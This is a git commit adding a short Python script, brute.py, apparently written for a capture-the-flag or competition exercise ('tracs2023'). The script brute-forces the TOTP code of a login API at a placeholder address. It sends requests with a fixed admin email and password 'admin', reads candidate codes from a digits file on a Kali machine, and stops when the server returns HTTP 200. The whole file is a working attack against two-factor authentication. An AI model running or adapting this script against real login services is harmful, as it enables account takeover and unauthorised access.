5f731b9c80056a23a79fe11c10c41d712ccf2300
Thomas Peugnet <97756028+Hydrocarbure-H@users.noreply.github.com>
2023-12-02 12:10:18 -0600

    Create brute.py

---
+++ tracs2023/brute.py
@@ -0,0 +1,29 @@
+import requests
+import sys
+import json
+
+url = "http://n.n.n.n:5000/api/login"
+
+
+def brute():
+    with open("/home/kali-user/Documents/tracs3/digits.txt", "r") as f:
+        c = 0
+        for line in f:
+            c += 1
+            totp = line.strip()
+            if c % 500 == 0:
+                print("[*] Trying: " + totp)
+
+            password = "admin"
+            headers = {"Content-Type": "application/json"}
+            data = {"email": "admin@trade.local", "password": password, "totp": totp}
+            data_json = json.dumps(data)
+
+            r = requests.post(url, data=data_json, headers=headers, verify=False)
+            if r.status_code == 200:
+                print("[+] Password found: " + password)
+                sys.exit()
+
+
+if __name__ == "__main__":
+    brute()
